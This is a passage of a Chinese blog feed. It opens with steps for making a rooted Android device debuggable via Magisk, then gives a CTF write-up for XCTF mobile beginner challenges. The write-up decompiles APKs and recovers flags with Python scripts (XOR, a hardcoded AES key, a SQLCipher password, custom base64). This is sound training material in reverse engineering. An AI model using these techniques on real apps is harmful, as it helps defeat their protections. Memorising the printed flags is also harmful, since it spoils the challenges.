才能运行。操作如下：</p><pre><code class="sh">marlin:/ # propsLoading... Please wait.MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Updating fingerprints list=====================================Checking connection.No connection.MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Select an option below.=====================================1 - Edit device fingerprint2 - Device simulation (disabled)3 - Edit MagiskHide props4 - Add/edit custom props5 - Delete prop values6 - Script settings7 - Collect logsr - Reset all options/settingsb - Reboot devicee - ExitSee the module readme or thesupport thread @ XDA for details.Enter your desired option: 3MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== MagiskHide props (active) Select an option below:=====================================Change the sensitive props set by MagiskHide.1 - ro.debuggable2 - ro.secure3 - ro.build.type4 - ro.build.tags5 - ro.build.selinuxa - Change all propsb - Go back to main menue - ExitPick several options at once byseparating inputs with a comma.Example: 1,5,6See the module readme or thesupport thread @ XDA for details.Enter your desired option: 1MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== ro.debuggable=====================================Currently set to 0.You currently have the safe value set.Are you sure you want to change it to 1?Enter y(es), n(o) or e(xit): yMagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Reboot - ro.debuggable=====================================Reboot for changes to take effect.Do you want to reboot now (y/n)?Enter y(es), n(o) or e(xit): yRebooting...</code></pre><p>重启后也可以动态调了，同样可以用 monitor 来验证有没有成功。</p><h2 id="Magisk-命令"><a href="#Magisk-命令" class="headerlink" title="Magisk 命令"></a>Magisk 命令</h2><p>使用 Magisk 的命令也可以实现：</p><pre><code class="bash">magisk resetprop ro.debuggable 1stop; start; # 必须用这种方式重启</code></pre><p>在调试的过程中发现在 Pixel 下如果开了调试会出现开发者选项无法打开的问题，暂时没有解决方法。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">https://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</a><br><a href="https://bbs.pediy.com/thread-248322.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248322.htm</a><br><a href="https://www.renyiwei.com/archives/1704.html" target="_blank" rel="noopener">https://www.renyiwei.com/archives/1704.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-MOBILE-新手练习区</title>
    <link href="/2020/02/20/%5BTODO%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MOBILE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <url>/2020/02/20/%5BTODO%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MOBILE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<p>持续更新。</p><a id="more"></a><h1 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h1><p>将 apk 拖入 jadx 进行反编译，查看入口点 MainActivity 代码：</p><pre><code class="java">package com.example.yaphetshan.tencentgreat;import android.content.pm.PackageInfo;import android.content.pm.PackageManager.NameNotFoundException;import android.os.Bundle;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    Button btn;    public final String pName = BuildConfig.APPLICATION_ID;    EditText text;    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        this.btn = (Button) findViewById(R.id.checBtn);        this.text = (EditText) findViewById(R.id.input);        this.btn.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                try {                    String inputString = MainActivity.this.text.getText().toString();                    PackageInfo pinfo = MainActivity.this.getPackageManager().getPackageInfo(BuildConfig.APPLICATION_ID, AccessibilityNodeInfoCompat.ACTION_COPY);                    String versionCode = pinfo.versionName; // 获取包信息中的versionName                    int versionName = pinfo.versionCode; // 获取包信息中的versionCode                    int i = 0;                    while (i &lt; inputString.length() &amp;&amp; i &lt; versionCode.length()) {                        if (inputString.charAt(i) != (versionCode.charAt(i) ^ versionName)) { // 将versionCode中的每一字节和versionName异或并和输入比较                            Toast.makeText(MainActivity.this, &quot;\u518d\u63a5\u518d\u5389\uff0c\u52a0\u6cb9~&quot;, 1).show(); // 再接再厉，加油~                            return;                        }                        i++;                    }                    if (inputString.length() == versionCode.length()) { // 判断输入的长度和versionCode是否相同                        Toast.makeText(MainActivity.this, &quot;\u606d\u559c\u5f00\u542f\u95ef\u5173\u4e4b\u95e8\uff01&quot;, 1).show(); // 恭喜开启闯关之门！                        return;                    }                } catch (NameNotFoundException e) {                }                Toast.makeText(MainActivity.this, &quot;\u5e74\u8f7b\u4eba\u4e0d\u8981\u800d\u5c0f\u806a\u660e\u5662&quot;, 1).show(); // 年轻人不要耍小聪明噢            }        });    }}</code></pre><p>代码中可以判断出是将 versionCode 和 versionName 进行异或然后和输入比较，具体信息可以在 AndroidManifest.xml 中找到：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;15&quot; android:versionName=&quot;X&lt;cP[?PHNB&lt;P?aj&quot; package=&quot;com.example.yaphetshan.tencentgreat&quot; platformBuildVersionCode=&quot;25&quot; platformBuildVersionName=&quot;7.1.1&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;19&quot; android:targetSdkVersion=&quot;25&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;meta-data android:name=&quot;android.support.VERSION&quot; android:value=&quot;25.3.0&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot; android:supportsRtl=&quot;true&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;&gt;        &lt;activity android:name=&quot;com.example.yaphetshan.tencentgreat.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>编写脚本来得到 flag：</p><pre><code class="python">#!/usr/bin/env pythonversionCode = 15versionName = &quot;X&lt;cP[?PHNB&lt;P?aj&quot;flag = &#39;&#39;for c in versionName:    flag += chr(ord(c) ^ versionCode)print flag# W3l_T0_GAM3_0ne</code></pre><h1 id="app2"><a href="#app2" class="headerlink" title="app2"></a>app2</h1><p>先使用 jadx 反编译，查看入口点的代码，在两个输入框中输入字符串后会去调用 SecondActivity：</p><pre><code class="java">package com.tencent.testvuln;import android.annotation.SuppressLint;import android.app.Activity;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.os.Handler;import android.support.v4.BuildConfig;import android.util.Log;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import com.tencent.testvuln.c.SignatureTool;@SuppressLint({&quot;ShowToast&quot;})public class MainActivity extends Activity implements OnClickListener {    private Button a;    private Handler b = null;    private EditText c;    private EditText d;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main);        this.a = (Button) findViewById(R.id.button1);        this.a.setOnClickListener(this);        this.c = (EditText) findViewById(R.id.editText1);        this.d = (EditText) findViewById(R.id.editText2);        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putLong(&quot;ili&quot;, System.currentTimeMillis());        edit.commit();        Log.d(&quot;hashcode&quot;, SignatureTool.getSignature(this) + BuildConfig.VERSION_NAME);    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.main, menu);        return true;    }    public boolean onOptionsItemSelected(MenuItem menuItem) {        if (menuItem.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(menuItem);    }    public void onClick(View view) {        switch (view.getId()) {            case R.id.button1:                if (this.c.getText().length() == 0 || this.d.getText().length() == 0) {                    Toast.makeText(this, &quot;\u4e0d\u80fd\u4e3a\u7a7a&quot;, 1).show(); // 不能为空                    return;                }                String obj = this.c.getText().toString(); // 获取第一个输入框中的字符串                String obj2 = this.d.getText().toString(); // 获取第二个输入框中的字符串                Log.e(&quot;test&quot;, obj + &quot; test2 = &quot; + obj2);                Intent intent = new Intent(this, SecondActivity.class); // 设置Intent跳转到SecondActivity                intent.putExtra(&quot;ili&quot;, obj); // 设置变量ili的值为obj的值                intent.putExtra(&quot;lil&quot;, obj2); // 设置变量lil的值为obj2的值                startActivity(intent); // 调用SecondActivity                return;            default:                return;        }    }}</code></pre><p>接下来看看 SecondActivity，将输入的字符串拼接起来，经过 Encryto.doRawData 的操作后和一串 base64 进行比较：</p><pre><code class="java">package com.tencent.testvuln;import android.content.BroadcastReceiver;import android.content.Context;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.view.Menu;import android.view.MenuItem;import android.widget.Toast;import com.tencent.testvuln.c.Encryto;public class SecondActivity extends a {    private BroadcastReceiver c = new BroadcastReceiver(this) {        final /* synthetic */ SecondActivity a;        {            this.a = r1;        }        public void onReceive(Context context, Intent intent) {            Toast.makeText(context, &quot;myReceiver receive&quot;, 0).show();            if (!context.getPackageName().equals(intent.getAction())) {            }        }    };    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main2);        Intent intent = getIntent();        String stringExtra = intent.getStringExtra(&quot;ili&quot;); // obj        String stringExtra2 = intent.getStringExtra(&quot;lil&quot;); // obj2        if (Encryto.doRawData(this, stringExtra + stringExtra2).equals(&quot;VEIzd/V2UPYNdn/bxH3Xig==&quot;)) { // 判断obj+obj2经过Encryto.doRawData后是否等于指定字符串            intent.setAction(&quot;android.test.action.MoniterInstallService&quot;);            intent.setClass(this, MoniterInstallService.class);            intent.putExtra(&quot;company&quot;, &quot;tencent&quot;);            intent.putExtra(&quot;name&quot;, &quot;hacker&quot;);            intent.putExtra(&quot;age&quot;, 18);            startActivity(intent);            startService(intent);        }        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putString(&quot;ilil&quot;, stringExtra);        edit.putString(&quot;lili&quot;, stringExtra2);        edit.commit();    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.main, menu);        return true;    }    public boolean onOptionsItemSelected(MenuItem menuItem) {        if (menuItem.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(menuItem);    }}</code></pre><p>然后我找到了 Encryto.doRawData 函数的位置。可以看到这里的所有函数都是在 Native 层实现的：</p><pre><code class="java">package com.tencent.testvuln.c;public class Encryto {    public static native int checkSignature(Object obj);    public static native String decode(Object obj, String str);    public static native String doRawData(Object obj, String str);    public static native String encode(Object obj, String str);    public native String HelloLoad();    static {        System.loadLibrary(&quot;JNIEncrypt&quot;);    }}</code></pre><p>用 IDA 打开 libJNIEncrypt.so，然后定位到 JNI_OnLoad，并找到被动态注册的函数：</p><pre><code>.data:00006008 off_6008        DCD aChecksignature_0   ; DATA XREF: register_ndk_load+22↑o.data:00006008                                         ; .text:off_221C↑o.data:00006008                                         ; &quot;checkSignature&quot;.data:0000600C                 DCD aLjavaLangObjec     ; &quot;(Ljava/lang/Object;)I&quot;.data:00006010                 DCD check+1.data:00006014                 DCD aDecode_0           ; &quot;decode&quot;.data:00006018                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:0000601C                 DCD decode+1.data:00006020                 DCD aEncode_0           ; &quot;encode&quot;.data:00006024                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:00006028                 DCD encode+1.data:0000602C                 DCD aDorawdata_0        ; &quot;doRawData&quot;.data:00006030                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:00006034                 DCD doRawData+1.data:00006034 ; .data         ends</code></pre><p>看一下其中的 doRawData 函数，发现其中调用了一个 j_AES_128_ECB_PKCS5Padding_Encrypt 函数，可以大概推断出经过了 AES-128 的加密，且加密模式用了 ECB，Padding 用了 PKCS5：</p><pre><code class="cpp">int __fastcall doRawData(_JNIEnv *env, int a2, int a3, char *string){  _JNIEnv *v4; // r4  char *v5; // r9  const char *utf_string; // r6  int ciphertext; // r8  int result; // r0  jstring (__cdecl *v9)(JNIEnv *, const jchar *, jsize); // r6  char *v10; // r5  size_t v11; // r2  int key; // [sp+0h] [bp-28h]  int v13; // [sp+18h] [bp-10h]  v4 = env;  v5 = string;  if ( j_checkSignature((int)env, a2, a3) == 1    &amp;&amp; (strcpy((char *)&amp;key, &quot;thisisatestkey==&quot;),        utf_string = (const char *)((int (__fastcall *)(_JNIEnv *, char *, _DWORD))v4-&gt;functions-&gt;GetStringUTFChars)(                                     v4,                                     v5,                                     0),        ciphertext = j_AES_128_ECB_PKCS5Padding_Encrypt(utf_string, (int)&amp;key),        ((void (__fastcall *)(_JNIEnv *, char *, const char *))v4-&gt;functions-&gt;ReleaseStringUTFChars)(v4, v5, utf_string),        result = ((int (__fastcall *)(_JNIEnv *, int))v4-&gt;functions-&gt;NewStringUTF)(v4, ciphertext),        _stack_chk_guard == v13) )  {    return result;  }  do  {    v9 = v4-&gt;functions-&gt;NewString;    v10 = UNSIGNATURE[0];    v11 = strlen(UNSIGNATURE[0]);  }  while ( _stack_chk_guard != v13 );  result = ((int (__fastcall *)(_JNIEnv *, char *, size_t))v9)(v4, v10, v11);  return result;}</code></pre><p>然后进去看到加密完成之后进行了 base64 加密在返回密文：</p><pre><code class="cpp">int __fastcall AES_128_ECB_PKCS5Padding_Encrypt(const char *a1, int a2){  int v2; // r9  const char *v3; // r10  signed int v4; // r0  signed int v5; // r5  _BYTE *v6; // r11  signed int v7; // r0  const char *v8; // r1  signed int v9; // r8  char *v10; // r10  int v11; // r5  _BYTE *v12; // r0  signed int v13; // r2  char v14; // r6  int v15; // r6  int v16; // r4  int v17; // r5  v2 = a2;  v3 = a1;  v4 = strlen(a1);  v5 = v4;  if ( v4 &lt;= 15 )  {    v6 = malloc(0x10u);    v7 = 0;    do    {      v8 = &amp;byte_3BB0[16 - v5];      if ( v7 &lt; v5 )        v8 = &amp;v3[v7];      v6[v7++] = *v8;    }    while ( v7 != 16 );    v9 = 16;    v10 = (char *)malloc(0x10u);    v11 = 1;LABEL_18:    v15 = 0;    v16 = 0;    do    {      j_AES128_ECB_encrypt(&amp;v6[v15], v2, &amp;v10[v15]);      ++v16;      v15 += 16;    }    while ( v16 &lt; v11 );    goto LABEL_22;  }  v9 = (v4 + 16) &amp; 0xFFFFFFF0;  v12 = malloc(v9);  v6 = v12;  if ( v9 &lt;= 0 )  {    v10 = (char *)malloc((v5 + 16) &amp; 0xFFFFFFF0);    goto LABEL_22;  }  v13 = 0;  do  {    if ( v13 &gt;= v5 )    {      if ( !(v5 &amp; 0xF) )      {        v12[v13] = 16;        goto LABEL_15;      }      v14 = byte_3BB0[v9 - v5];    }    else    {      v14 = v3[v13];    }    v12[v13] = v14;LABEL_15:    ++v13;  }  while ( v9 != v13 );  v10 = (char *)malloc((v5 + 16) &amp; 0xFFFFFFF0);  if ( v9 &gt;= 16 )  {    v11 = v9 / 16;    goto LABEL_18;  }LABEL_22:  v17 = j_b64_encode((int)v10, v9);  free(v6);  free(v10);  return v17;}</code></pre><p>用 Python 脚本解密得到明文：</p><pre><code class="python">#!/usr/bin/env pythonfrom Crypto.Cipher import AESkey = &#39;thisisatestkey==&#39;aes = AES.new(key, AES.MODE_ECB)ciphertext = &#39;VEIzd/V2UPYNdn/bxH3Xig==&#39;.decode(&#39;base64&#39;)print aes.decrypt(ciphertext)# aimagetencent</code></pre><p>尝试提交这串字符串提示错误，再尝试用这字符串登录也没得到什么结果，那么继续往下分析。发现其中调用了多次 Intent，还设置了 IntentFilter，看的眼花缭乱都没找到 flag 在哪里。再去尝试一下交叉引用，看看哪些类调用了 Encryto 类，发现了 FileDataActivity 类中调用了 decode 方法，在 IDA 中可以发现 decode 和 doRawData 的功能一模一样：</p><pre><code class="java">package com.tencent.testvuln;import android.os.Bundle;import android.widget.TextView;import com.tencent.testvuln.c.Encryto;public class FileDataActivity extends a {    private TextView c;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main3);        this.c = (TextView) findViewById(R.id.textView1);        this.c.setText(Encryto.decode(this, &quot;9YuQ2dk8CSaCe7DTAmaqAA==&quot;));    }}</code></pre><p>最后用这里的密文解密得到了 flag：</p><pre><code class="python">...ciphertext2 = &#39;9YuQ2dk8CSaCe7DTAmaqAA==&#39;.decode(&#39;base64&#39;)print aes.decrypt(ciphertext2)# Cas3_0f_A_CAK3</code></pre><h1 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h1><p>拿到文件用 file 没有识别出来，xxd 看一下：</p><pre><code class="bash">$ xxd app3.ab | head00000000: 414e 4452 4f49 4420 4241 434b 5550 0a32  ANDROID BACKUP.200000010: 0a31 0a6e 6f6e 650a 78da e47a e55f 936f  .1.none.x..z._.o00000020: fcaf 8a74 8e1e 0d1b 5d63 0361 303a 4797  ...t....]c.a0:G.00000030: 8422 3d06 8ab4 c248 a507 a373 3046 2328  .&quot;=....H...s0F#(00000040: 2a65 a088 d20c 4623 8222 4883 a252 5202  *e....F#.&quot;H..RR.00000050: 9e7d 7fe7 75fe 80f3 e43c 39d7 93fb 75bf  .}..u....&lt;9...u.00000060: b6dd d775 7de2 1df7 2e8f a0a0 5045 afc0  ...u}.......PE..00000070: bb0a a808 8fbb 41fe 2805 8c47 902f 2a2c  ......A.(..G./*,00000080: d4d7 2340 210c 15e0 850a 080b 47f9 53be  ..#@!.......G.S.00000090: 8052 f450 f4f4 0845 2978 04dd b9f4 7f37  .R.P...E)x.....7</code></pre><p>搜了一下发现是安卓备份文件，可以用 Android Backup Extractor 来解压：</p><pre><code class="bash">$ java -jar abe.jar unpack app3.ab app3.tar &quot;&quot;0% 1% 2% 3% 4% 5% 6% 7% 8% 9% 10% 11% 12% 13% 14% 15% 16% 17% 18% 19% 20% 21% 22% 23% 24% 25% 26% 27% 28% 29% 30% 31% 32% 33% 34% 35% 36% 37% 38% 39% 40% 41% 42% 43% 44% 45% 46% 47% 48% 49% 50% 51% 52% 53% 54% 55% 56% 57% 58% 59% 60% 61% 62% 63% 64% 65% 66% 67% 68% 69% 70% 71% 72% 73% 74% 75% 76% 77% 78% 79% 80% 81% 82% 83% 84% 85% 86% 87% 88% 89% 90% 91% 92% 93% 94% 95% 96% 97% 98% 99% 100%9097216 bytes written to /Users/assassinq/Downloads/app3.tar.</code></pre><p>在解压得到的 tar 包：</p><pre><code class="bash">$ x app3.tarx apps/com.example.yaphetshan.tencentwelcome/a/base.apkx apps/com.example.yaphetshan.tencentwelcome/db/Demo.dbx apps/com.example.yaphetshan.tencentwelcome/Encryto.dbx apps/com.example.yaphetshan.tencentwelcome/_manifest</code></pre><p>生成的文件中，两个 db 都是被加密了的 sqlite 数据库。先来用 jadx 看看 base.apk，可以看到 <code>a()</code> 函数通过一些操作计算出一个密码，来获得一个数据库的接口。详细分析我记录在了注释中，其他的分析再看之后的函数：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome;import android.content.ContentValues;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import com.example.yaphetshan.tencentwelcome.a.a;import net.sqlcipher.database.SQLiteDatabase;public class MainActivity extends AppCompatActivity implements OnClickListener {    private SQLiteDatabase a;    private a b;    private Button c;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        this.c = (Button) findViewById(R.id.add_data);        this.c.setOnClickListener(this);        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putString(&quot;Is_Encroty&quot;, &quot;1&quot;); // Is_Encroty=&quot;1&quot;        edit.putString(&quot;Encryto&quot;, &quot;SqlCipher&quot;); // Encryto=&quot;SqlCipher&quot;        edit.putString(&quot;ver_sion&quot;, &quot;3_4_0&quot;); // ver_sion=&quot;3_4_0&quot;        edit.apply();        a();    }    private void a() {        SQLiteDatabase.loadLibs(this);        this.b = new a(this, &quot;Demo.db&quot;, null, 1); // 打开Demo.db        ContentValues contentValues = new ContentValues();        contentValues.put(&quot;name&quot;, &quot;Stranger&quot;); // name=&quot;Stanger&quot;        contentValues.put(&quot;password&quot;, Integer.valueOf(123456)); // password=123456        a aVar = new a();        String a = aVar.a(contentValues.getAsString(&quot;name&quot;), contentValues.getAsString(&quot;password&quot;)); // a = name[:4] + password[:4]        this.a = this.b.getWritableDatabase(aVar.a(a + aVar.b(a, contentValues.getAsString(&quot;password&quot;))).substring(0, 7)); // 将SHA1(a+MD5(a)+&quot;yaphetshan&quot;)[:7]作为密码，获取指定数据库接口        this.a.insert(&quot;TencentMicrMsg&quot;, null, contentValues); // 将数据contentValues插入表TencentMicrMsg    }    public void onClick(View view) {        if (view == this.c) {            Intent intent = new Intent();            intent.putExtra(&quot;name&quot;, &quot;name&quot;);            intent.putExtra(&quot;password&quot;, &quot;pass&quot;);            intent.setClass(this, AnotherActivity.class);            startActivity(intent);        }    }}</code></pre><p>在同一包下的 a 类中，看到了数据库 TencentMicrMsg 的结构，其中有一个 F_l_a_g 字段，可以判断是 flag：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome;import android.content.Context;import net.sqlcipher.database.SQLiteDatabase;import net.sqlcipher.database.SQLiteDatabase.CursorFactory;import net.sqlcipher.database.SQLiteOpenHelper;/* compiled from: DatabaseManager */public class a extends SQLiteOpenHelper {    private int a = 0;    public a(Context context, String str, CursorFactory cursorFactory, int i) { // 打开指定数据库        super(context, str, cursorFactory, i);    }    public void onCreate(SQLiteDatabase sQLiteDatabase) {        sQLiteDatabase.execSQL(&quot;create table TencentMicrMsg(name text,password integer,F_l_a_g text)&quot;); // 表TencentMicrMsg中三个字段分别是text、integer和text    }    public void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) {    }}</code></pre><p>在包 a 下的 a 类，其中两个函数可以根据 b 类的函数分析得到功能：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome.a;/* compiled from: Cipher */public class a {    private String a = &quot;yaphetshan&quot;;    public String a(String str, String str2) {        String substring = str.substring(0, 4);        return substring + str2.substring(0, 4);    }    public String b(String str, String str2) { // 返回MD5十六进制字符串        b bVar = new b();        return b.a(str);    }    public String a(String str) { // 返回SHA1(str+&quot;yaphetshan&quot;)的十六进制字符串        b bVar = new b();        return b.b(str + this.a);    }}</code></pre><p>包 a 下的 b 类，根据 MessageDigest 创建的实例可以分别判断出是获取 MD5 和 SHA-1 的十六进制摘要：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome.a;import java.security.MessageDigest;/* compiled from: SHA1Manager */public class b {    public static final String a(String str) { // 获取MD5十六进制字符串        int i = 0;        char[] cArr = new char[]{&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;};        try {            byte[] bytes = str.getBytes();            MessageDigest instance = MessageDigest.getInstance(&quot;MD5&quot;);            instance.update(bytes);            byte[] digest = instance.digest(); // 获取MD5哈希摘要            int length = digest.length;            char[] cArr2 = new char[(length * 2)];            int i2 = 0;            while (i &lt; length) {                byte b = digest[i];                int i3 = i2 + 1;                cArr2[i2] = cArr[(b &gt;&gt;&gt; 4) &amp; 15];                i2 = i3 + 1;                cArr2[i3] = cArr[b &amp; 15];                i++;            }            return new String(cArr2);        } catch (Exception e) {            return null;        }    }    public static final String b(String str) { // 获取SHA1十六进制字符串        int i = 0;        char[] cArr = new char[]{&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;};        try {            byte[] bytes = str.getBytes();            MessageDigest instance = MessageDigest.getInstance(&quot;SHA-1&quot;);            instance.update(bytes);            byte[] digest = instance.digest(); // 获取SHA1哈希摘要            int length = digest.length;            char[] cArr2 = new char[(length * 2)];            int i2 = 0;            while (i &lt; length) {                byte b = digest[i];                int i3 = i2 + 1;                cArr2[i2] = cArr[(b &gt;&gt;&gt; 4) &amp; 15];                i2 = i3 + 1;                cArr2[i3] = cArr[b &amp; 15];                i++;            }            return new String(cArr2);        } catch (Exception e) {            return null;        }    }}</code></pre><p>那么根据上面的分析可以正向地得到密码：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibmd5hash = lambda m: hashlib.md5(m).hexdigest()sha1hash = lambda m: hashlib.sha1(m).hexdigest()name = &quot;Stranger&quot;password = &quot;123456&quot;a = name[:4] + password[:4]database = sha1hash(a + md5hash(a) + &quot;yaphetshan&quot;)[:7]print database# ae56f99</code></pre><p>打开 Decypt.db 库，查看表中数据：</p><p><img src="/pics/攻防世界-MOBILE-新手练习区/1.png" srcset="/img/loading.gif" alt></p><p>将字段中的字符串解 base64：</p><pre><code class="bash">$ echo &quot;VGN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0=&quot; | base64 -DTctf{H3ll0_Do_Y0u_Lov3_Tenc3nt!}</code></pre><h1 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy-apk"></a>easy-apk</h1><p>把 apk 拖进 jadx，反编译查看入口事件代码，判断出对输入进行了 Base64 加密：</p><pre><code class="java">package com.testjava.jack.pingan1;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() {            public void onClick(View view) {                if (new Base64New().Base64Encode(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString().getBytes()).equals(&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&quot;)) {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u901a\u8fc7!&quot;, 1).show(); // 验证通过!                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u5931\u8d25!&quot;, 1).show(); // 验证失败!                }            }        });    }}</code></pre><p>再看看 Base64New 类中代码，发现是一个换表的 base64：</p><pre><code class="java">package com.testjava.jack.pingan1;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;public class Base64New {    private static final char[] Base64ByteToStr = new char[]{&#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;y&#39;, &#39;z&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;8&#39;, &#39;9&#39;, &#39;+&#39;, &#39;/&#39;};    private static final int RANGE = 255;    private static byte[] StrToBase64Byte = new byte[AccessibilityNodeInfoCompat.ACTION_CLEAR_ACCESSIBILITY_FOCUS];    public String Base64Encode(byte[] bytes) {        StringBuilder res = new StringBuilder();        for (int i = 0; i &lt;= bytes.length - 1; i += 3) {            int k;            byte[] enBytes = new byte[4];            byte tmp = (byte) 0;            for (k = 0; k &lt;= 2; k++) {                if (i + k &lt;= bytes.length - 1) {                    enBytes[k] = (byte) (((bytes[i + k] &amp; RANGE) &gt;&gt;&gt; ((k * 2) + 2)) | tmp);                    tmp = (byte) ((((bytes[i + k] &amp; RANGE) &lt;&lt; (((2 - k) * 2) + 2)) &amp; RANGE) &gt;&gt;&gt; 2);                } else {                    enBytes[k] = tmp;                    tmp 